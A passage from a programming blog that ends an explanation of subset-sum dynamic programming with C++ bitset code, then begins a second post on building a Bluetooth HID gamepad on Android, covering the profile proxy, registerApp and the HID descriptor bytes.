mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mord text"><span class="mord textrm"> or </span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord textrm">otherwise</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>

<p>We can see from this that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>s</mi><mi>s</mi><mo stretchy="false">(</mo><mo>&#x22c5;</mo><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">sss(\cdot, k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord">&#x22c5;</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span> only depends on values of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>s</mi><mi>s</mi><mo stretchy="false">(</mo><mo>&#x22c5;</mo><mo separator="true">,</mo><mi>k</mi><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">sss(\cdot, k-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord">&#x22c5;</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>. As such, we can “optimise” this algorithm into an iterative one, performing the following transformation at every step:</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>s</mi><mi>s</mi><mi>s</mi><mo stretchy="false">[</mo><mi>t</mi><mo stretchy="false">]</mo><mo>&#x21a6;</mo><mi>s</mi><mi>s</mi><mi>s</mi><mo stretchy="false">[</mo><mi>t</mi><mo stretchy="false">]</mo><mo>&#x2228;</mo><mi>s</mi><mi>s</mi><mi>s</mi><mo stretchy="false">[</mo><mi>t</mi><mo>&#x2212;</mo><mi>w</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">sss[t] \mapsto sss[t] \vee sss[t - w[k]]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">t</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↦</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">t</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mclose">]</span></span></span></span></span></p>

<p>With <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>s</mi><mi>s</mi><mo stretchy="false">[</mo><mi>t</mi><mo stretchy="false">]</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">sss[t] = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">t</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> if <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">t = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> otherwise 0 initially.</p>

<p>Since we’re working with boolean values, that looks like a bitshift! Translating this to C++ code:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">bitset</span><span class="o">&lt;</span><span class="n">T</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span> <span class="n">sss</span> <span class="o">=</span> <span class="p">{</span><span class="mi">1</span><span class="p">};</span>
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">w_i</span> <span class="o">:</span> <span class="n">w</span><span class="p">)</span> <span class="n">sss</span> <span class="o">|=</span> <span class="p">(</span><span class="n">sss</span> <span class="o">&lt;&lt;</span> <span class="n">w_i</span><span class="p">);</span>
<span class="c1">// answer is sss[T]</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Solved in only two or three lines.</p>

<h2 id="variations-of-this-problem"><a href="#variations-of-this-problem">Variations of this problem</a></h2>

<p>Since we are able to calculate <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>s</mi><mi>s</mi><mo stretchy="false">(</mo><mi>t</mi><mo separator="true">,</mo><mi>N</mi><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">sss(t, N-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> for all <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span>, we can also answer some optimisation problems:</p>

<ul>
  <li>What is the largest sum possible under <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>? (find the highest bit set)</li>
  <li>How close can we get to T? (Use a bitset of length <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>T</mi></mrow><annotation encoding="application/x-tex">2T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>)</li>
</ul>

<p>We can also solve similar problems, such as:</p>

<ul>
  <li><a href="https://orac.amt.edu.au/cgi-bin/train/problem.pl?set=aiio13&amp;problemid=649">AIIO2013 - Flatman’s Tower</a>: Input is a list of pairs. We can pick at most one value from each pair. (<code class="language-plaintext highlighter-rouge">sss |= (sss &lt; a) | (sss &lt; b)</code>)</li>
</ul>

<h2 id="backtracking"><a href="#backtracking">Backtracking</a></h2>

<p>In fact, we can even recover the subset used to make the sum by noticing that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">w[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span> allows us to “reach” all <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span> where <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>s</mi><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>t</mi><mo stretchy="false">]</mo><mo>&#x2227;</mo><mi mathvariant="normal">&#xac;</mi><mi>s</mi><mi>s</mi><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>t</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">sss[i+1][t] \wedge \neg sss[i][t]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal">t</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2227;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">&#xac;</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal">t</span><span class="mclose">]</span></span></span></span> is true:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">bitset</span><span class="o">&lt;</span><span class="n">T</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span> <span class="n">sss</span><span class="p">[</span><span class="n">N</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="n">sss</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">sss</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">|</span> <span class="p">(</span><span class="n">sss</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="c1">// Assuming it's possible to sum to T</span>
<span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span> <span class="n">taken</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">N</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">t</span> <span class="o">=</span> <span class="n">T</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">sss</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">t</span><span class="p">])</span> <span class="p">{</span>
		<span class="c1">// We need w[i]</span>
		<span class="n">taken</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
		<span class="n">t</span> <span class="o">-=</span> <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/bluehid-2">BlueHID Details, part 2 - WTF is a HID descriptor?!</a></h2>
  
    <div class="bounded"><p>Now that we’ve got our Bluetooth HID support up (either through part 1 or by being on P), it’s time to start using the API. At the beginning it’s like another Bluetooth profile, but things start get much worse (if you’re new to the HID specification) as you get deep into the implementation.</p>

<!--more-->

<p>As always, the final code is available on github at <a href="https://github.com/ralismark/bluehid">ralismark/bluehid</a>.</p>

<h2 id="getting-ready-for-hid"><a href="#getting-ready-for-hid">Getting ready for HID</a></h2>

<p>We need to first set up Bluetooth and get the appropriate profile, as you would for any profile. Initially, you need to get the Bluetooth adapter and enable Bluetooth if it’s not already. Then, you need to get a paired device, either through discovery or from existing paired devices (whatever is appropriate). This is described well and in detail in the <a href="https://developer.android.com/guide/topics/connectivity/bluetooth">Bluetooth Overview</a>, so I won’t repeat what’s there.</p>

<p>Afterwards, you need to get the proxy - <code class="language-plaintext highlighter-rouge">BluetoothHidDevice</code> or <code class="language-plaintext highlighter-rouge">BluetoothInputHost</code> (depending on API level) - to be able to communicate with the HID service we previously enabled. This is done with <a href="https://developer.android.com/reference/android/bluetooth/BluetoothAdapter#getProfileProxy(android.content.Context,%20android.bluetooth.BluetoothProfile.ServiceListener,%20int)"><code class="language-plaintext highlighter-rouge">BluetoothAdapter.getProfileProxy()</code></a>.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="kd">private</span> <span class="nc">BluetoothAdapter</span> <span class="n">mBtAdapter</span><span class="o">;</span> <span class="c1">// obtained as you normally would</span>
<span class="kd">private</span> <span class="nc">BluetoothInputHost</span> <span class="n">mBtHidDevice</span><span class="o">;</span>

<span class="o">...</span>

<span class="n">mBtAdapter</span><span class="o">.</span><span class="na">getProfileProxy</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="k">new</span> <span class="nc">BluetoothProfile</span><span class="o">.</span><span class="na">ServiceListener</span><span class="o">()</span> <span class="o">{</span>
	<span class="nd">@Override</span>
	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onServiceConnected</span><span class="o">(</span><span class="kt">int</span> <span class="n">profile</span><span class="o">,</span> <span class="nc">BluetoothProfile</span> <span class="n">proxy</span><span class="o">)</span> <span class="o">{</span>
		<span class="k">if</span> <span class="o">(</span><span class="n">profile</span> <span class="o">==</span> <span class="nc">BluetoothProfile</span><span class="o">.</span><span class="na">INPUT_HOST</span><span class="o">)</span> <span class="o">{</span>
			<span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="no">TAG</span><span class="o">,</span> <span class="s">"Got HID device"</span><span class="o">);</span>
			<span class="n">mBtHidDevice</span> <span class="o">=</span> <span class="o">(</span><span class="nc">BluetoothInputHost</span><span class="o">)</span> <span class="n">proxy</span><span class="o">;</span>

			<span class="c1">// see next section</span>
			<span class="n">registerApp</span><span class="o">();</span>
		<span class="o">}</span>
	<span class="o">}</span>

	<span class="nd">@Override</span>
	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onServiceDisconnected</span><span class="o">(</span><span class="kt">int</span> <span class="n">profile</span><span class="o">)</span> <span class="o">{</span>
		<span class="k">if</span> <span class="o">(</span><span class="n">profile</span> <span class="o">==</span> <span class="nc">BluetoothProfile</span><span class="o">.</span><span class="na">INPUT_HOST</span><span class="o">)</span> <span class="o">{</span>
			<span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="no">TAG</span><span class="o">,</span> <span class="s">"Lost HID device"</span><span class="o">);</span>
		<span class="o">}</span>
	<span class="o">}</span>
<span class="o">},</span> <span class="nc">BluetoothProfile</span><span class="o">.</span><span class="na">INPUT_HOST</span><span class="o">);</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This call essentially requests the proxy and saves it. I’ve extracted the code to setup Bluetooth HID into <code class="language-plaintext highlighter-rouge">registerApp()</code>, which we’ll see next.</p>

<p>If this is never called, it probably means that the service is not enabled. Check the previous post on how to do this in Oreo. I don’t have experience with P, so I can’t help you if you have this issue there.</p>

<h2 id="into-hid-hell"><a href="#into-hid-hell">Into HID Hell</a></h2>

<p>After this, if you look around the documentation for <code class="language-plaintext highlighter-rouge">BluetoothHidDevice</code>, you’ll see that you need to register your app. You reach <a href="https://developer.android.com/reference/android/bluetooth/BluetoothHidDevice#registerApp(android.bluetooth.BluetoothHidDeviceAppSdpSettings,%20android.bluetooth.BluetoothHidDeviceAppQosSettings,%20android.bluetooth.BluetoothHidDeviceAppQosSettings,%20java.util.concurrent.Executor,%20android.bluetooth.BluetoothHidDevice.Callback)"><code class="language-plaintext highlighter-rouge">registerApp()</code></a>, then recoil in horror at the signature (\s):</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">registerApp</span> <span class="o">(</span><span class="nc">BluetoothHidDeviceAppSdpSettings</span> <span class="n">sdp</span><span class="o">,</span>
                <span class="nc">BluetoothHidDeviceAppQosSettings</span> <span class="n">inQos</span><span class="o">,</span>
                <span class="nc">BluetoothHidDeviceAppQosSettings</span> <span class="n">outQos</span><span class="o">,</span>
                <span class="nc">Executor</span> <span class="n">executor</span><span class="o">,</span>
                <span class="nc">BluetoothHidDevice</span><span class="o">.</span><span class="na">Callback</span> <span class="n">callback</span><span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Fortunately, after looking at the description, we see we can ignore 2 of these parameters - <code class="language-plaintext highlighter-rouge">inQos</code> and <code class="language-plaintext highlighter-rouge">outQos</code> - and just set them to <code class="language-plaintext highlighter-rouge">null</code>. Another - <code class="language-plaintext highlighter-rouge">executor</code> - is also not present in Oreo, leaving us with <code class="language-plaintext highlighter-rouge">sdp</code> and <code class="language-plaintext highlighter-rouge">callback</code>. Diving into <code class="language-plaintext highlighter-rouge">BluetoothHidDeviceAppSdpSettings</code> (what a mouthful), we see several arguments in its constructor, including a link to <a href="https://www.usb.org/sites/default/files/documents/hid1_11.pdf">USB Device Class Definition for HIDs - firmware specification</a>. Read this well and get to understand the required sections, since it’s essential to everything from here on out.</p>

<p>Now, back to the constructor:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="kd">public</span> <span class="nf">BluetoothHidDeviceAppSdpSettings</span> <span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">,</span>
                <span class="nc">String</span> <span class="n">description</span><span class="o">,</span>
                <span class="nc">String</span> <span class="n">provider</span><span class="o">,</span>
                <span class="kt">byte</span> <span class="n">subclass</span><span class="o">,</span>
                <span class="kt">byte</span><span class="o">[]</span> <span class="n">descriptors</span><span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">name</code>, <code class="language-plaintext highlighter-rouge">description</code> and <code class="language-plaintext highlighter-rouge">provider</code> are easy - you can put pretty much any string for these. <code class="language-plaintext highlighter-rouge">subclass</code> isn’t too bad either after looking at the spec - there’s only two: none and boot device. We simply specify none (a single <code class="language-plaintext highlighter-rouge">0x00</code> byte) and move on, reaching <code class="language-plaintext highlighter-rouge">descriptor</code> and become confused.</p>

<p>This is the hell of HID hell. <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup></p>

<h2 id="through-hid-hell"><a href="#through-hid-hell">Through HID Hell</a></h2>

<p>The <code class="language-plaintext highlighter-rouge">descriptor</code> is made up of the main HID descriptor, followed (literally concatenated) by any other descriptors. This is the layout of the main descriptor, with unnecessary parts removed (we only need one extra descriptor, and fields for further ones are optional).</p>

<table>
  <thead>
    <tr>
      <th>Part</th>
      <th>Byte(s)</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">bLength</code></td>
      <td>0</td>
      <td>Length of main descriptor (not including other descriptor) - <code class="language-plaintext highlighter-rouge">0x09</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">bDescriptorType</code></td>
      <td>1</td>
      <td>HID descriptor type - <code class="language-plaintext highlighter-rouge">0x21</code> <sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote">2</a></sup></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">bcdHID</code></td>
      <td>2-3</td>
      <td>HID specification version, in little endian binary coded decimal - <code class="language-plaintext highlighter-rouge">0x11 0x01</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">bCountryCode</code></td>
      <td>4</td>
      <td>Country code - <code class="language-plaintext highlighter-rouge">0x00</code> for not localised (only relevant for keyboards)</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">bNumDescriptors</code></td>
      <td>5</td>
      <td>Number of extra descriptors - <code class="language-plaintext highlighter-rouge">0x01</code> (the report descriptor)</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">bDescriptorType</code></td>
      <td>6</td>
      <td>Report type <code class="language-plaintext highlighter-rouge">0x22</code> <sup id="fnref:2:1" role="doc-noteref"><a href="#fn:2" class="footnote">2</a></sup></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">wDescriptorLength</code></td>
      <td>7-8</td>
      <td>Length of the report descriptor type, in little endian</td>
    </tr>
  </tbody>
</table>

<p>It turns out, many of these values will always be the same. After this block in <code class="language-plaintext highlighter-rouge">descriptor</code>, you append the report descriptor, which describes the “device interface” - what inputs it has (e.g. buttons, joysticks, magic carpet controls<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote">3</a></sup>), what data it can receive (e.g. force feedback, which is extremely complicated to implement), and what other features it supports. The majority of the HID specification describes this and it somewhat complex representation. Fortunately, there’s <a href="https://www.usb.org/document-library/hid-descriptor-tool">HID descriptor tool</a> to generate this, and plenty of resources online on the content of the actual descriptor, so I won’t go into detail (again). One helpful site is this <a href="https://eleccelerator.com/tutorial-about-usb-hid-report-descriptors/">tutorial about USB HID report descriptors</a>, which provides an example for a device with a joystick and a gamepad with 20 buttons. Use the descriptor tool to generate the bytes making up the descriptor from the individual items.</p>

<p>Note that there can be multiple reports described, each with a different report ID (this will matter later), but we only have a single. Take the size of this report, and fill in <code class="language-plaintext highlighter-rouge">wDescriptorLength</code> in the main descriptor. Concatenate the two, and you get the <code class="language-plaintext highlighter-rouge">descriptor</code> argument:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="rouge-code"><pre><span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">descriptor</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span> <span class="o">{</span>
	<span class="c1">// HID descriptor</span>
	<span class="mh">0x09</span><span class="o">,</span> <span class="c1">// bLength</span>
	<span class="mh">0x21</span><span class="o">,</span> <span class="c1">// bDescriptorType</span>
	<span class="mh">0x11</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span> <span class="c1">// bcdHID</span>
	<span class="mh">0x00</span><span class="o">,</span> <span class="c1">// bCountryCode</span>
	<span class="mh">0x01</span><span class="o">,</span> <span class="c1">// bNumDescriptors</span>
	<span class="mh">0x22</span><span class="o">,</span> <span class="c1">// bDescriptorType</span>
	<span class="mh">0x30</span><span class="o">,</span> <span class="mh">0x00</span><span class="o">,</span> <span class="c1">// wDescriptorLength (48 in decimal)</span>

	<span class="c1">// Report descriptor - 4 buttons, 1 X/Y joystick</span>
	<span class="mh">0x05</span><span class="o">,</span> <span class="mh">0x01</span><span class="o">,</span>        <span class="c1">// USAGE_PAGE (Generic Desktop)</span>
	<span class="mh">0x09</span><span class="o">,</span> <span class="mh">0x05</span><span class="o">,</span>        <span class="c1">// USAGE (Game Pad)</span>
